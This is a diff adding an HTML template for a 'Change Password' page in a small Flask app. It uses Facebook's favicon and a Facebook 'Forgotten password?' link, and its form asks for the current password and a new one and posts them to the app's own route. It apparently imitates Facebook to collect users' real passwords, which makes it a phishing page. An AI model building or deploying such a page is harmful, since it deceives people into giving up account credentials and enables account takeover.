@@ -1,0 +1,48 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    
+    <title>Change Password</title>
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png">
+  </head>
+  <body>
+    <!-- Image and text -->
+<nav class="navbar">
+  
+    <a href="" class="change_pass">
+        Change Password
+    </a>
+    
+  </nav>
+        <form action="/" method="POST" >
+            <div id="lool">
+            {{ form.hidden_tag() }}
+            <!-- <input type="text" class="inpo" placeholder="Current Password"> -->
+            {{form.current_password(class="inpo",placeholder="Current Password")}}
+            <!-- <input type="text" class="inpo" placeholder="New password"> -->
+            {{form.new_pass(class="inpo",placeholder="New Password")}}
+            <!-- <input type="text" class="inpo" placeholder="Retype passwrod"> -->
+            {{form.retype_pass(class="inpo",placeholder="Retype Password")}}
+            </div>
+            <button class="changes">Changes Save</button>
+            <button class="bo">cancel</button>
+        
+        </form>
+        <center><a class="forgetcss" href="https://m.facebook.com/login/identify/">Forgotten password?</a></center>
+    
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+</html>
